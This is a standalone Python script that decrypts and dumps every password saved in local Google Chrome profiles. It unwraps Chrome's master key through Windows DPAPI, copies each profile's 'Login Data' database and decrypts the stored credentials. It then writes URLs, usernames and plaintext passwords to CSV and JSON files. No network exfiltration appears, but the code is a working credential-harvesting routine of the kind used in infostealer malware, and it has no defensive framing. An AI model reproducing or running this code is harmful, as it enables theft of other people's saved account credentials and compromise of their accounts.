import os
import json
import base64
import sqlite3
import shutil
import csv
import win32crypt
from datetime import datetime, timedelta
from Crypto.Cipher import AES

def get_encryption_key():
    local_state_path = os.path.join(
        os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"
    )
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    # Decode the base64-encoded key and remove the DPAPI prefix (first 5 bytes)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]

    # Decrypt the key using CryptUnprotectData
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return decrypted_key

def decrypt_password(ciphertext, key):
    try:
        # Debug: Print the raw encrypted data (hex format) for debugging
        print(f"[DEBUG] Encrypted data (hex): {ciphertext.hex()}")

        # Try AES-GCM decryption first
        if ciphertext[:3] == b'v10':  # Encrypted using AES-GCM
            if len(ciphertext) < 39:  # 3 for v10 + 12 IV + 16 tag + some payload
                raise ValueError("Ciphertext too short for AES-GCM")
            
            iv = ciphertext[3:15]
            payload = ciphertext[15:-16]
            tag = ciphertext[-16:]

            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt_and_verify(payload, tag)
            return decrypted.decode()
        else:
            # If AES-GCM decryption fails, fallback to DPAPI
            raise ValueError("Ciphertext is not in AES-GCM format, falling back to DPAPI decryption.")

    except Exception as e:
        print(f"⚠️ Error decrypting with AES-GCM: {e}")
        try:
            # Fallback to DPAPI decryption if AES-GCM fails
            print(f"[DEBUG] Trying DPAPI decryption")
            decrypted = win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1]
            return decrypted.decode()
        except Exception as fallback_error:
            print(f"⚠️ Error decrypting with DPAPI: {fallback_error}")
            return ""

def get_all_profiles():
    chrome_path = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data")
    return [
        f for f in os.listdir(chrome_path)
        if os.path.isdir(os.path.join(chrome_path, f)) and
        (f.startswith("Default") or f.startswith("Profile"))
    ]

def get_passwords_from_profile(profile, key, results):
    chrome_path = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data")
    db_path = os.path.join(chrome_path, profile, "Login Data")
    if not os.path.exists(db_path):
        return

    tmp_db = f"{profile}_LoginData_temp.db"
    shutil.copy2(db_path, tmp_db)

    conn = sqlite3.connect(tmp_db)
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
        for row in cursor.fetchall():
            url, username, encrypted_password, date_created = row
            password = decrypt_password(encrypted_password, key)

            if not username and not password:
                continue

            try:
                created_time = datetime(1601, 1, 1) + timedelta(microseconds=date_created)
                created_str = created_time.strftime("%Y-%m-%d %H:%M:%S")
            except Exception as e:
                created_str = ""
                print(f"⚠️ Error parsing date_created: {e}")

            # Debug log for each successfully retrieved password
            print(f"[DEBUG] Retrieved password for URL: {url} in profile {profile}")

            results.append({
                "Profile": profile,
                "URL": url,
                "Username": username,
                "Password": password,
                "Created": created_str
            })
    except Exception as e:
        print(f"⚠️ Error reading profile '{profile}': {e}")
    finally:
        cursor.close()
        conn.close()
        os.remove(tmp_db)

def export_to_csv(results):
    with open("chrome_passwords.csv", "w", newline='', encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["Profile", "URL", "Username", "Password", "Created"])
        writer.writeheader()
        for row in results:
            writer.writerow(row)

def export_to_json(results):
    with open("chrome_passwords.json", "w", encoding="utf-8") as f:
        json.dump(results, f, indent=4, ensure_ascii=False)

def main():
    key = get_encryption_key()
    profiles = get_all_profiles()
    results = []

    for profile in profiles:
        get_passwords_from_profile(profile, key, results)

    if results:
        export_to_csv(results)
        export_to_json(results)
        print(f"\n✅ Saved {len(results)} passwords to 'chrome_passwords.csv' and 'chrome_passwords.json'")
    else:
        print("\n🔍 No passwords found.")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        error_log_path = os.path.join(os.path.expanduser("~"), "Desktop", "error_log.txt")
        with open(error_log_path, "a", encoding="utf-8") as log_file:
            log_file.write(f"Error: {str(e)}\n")
        print(f"⚠️ An error occurred. Please check the log at {error_log_path}")
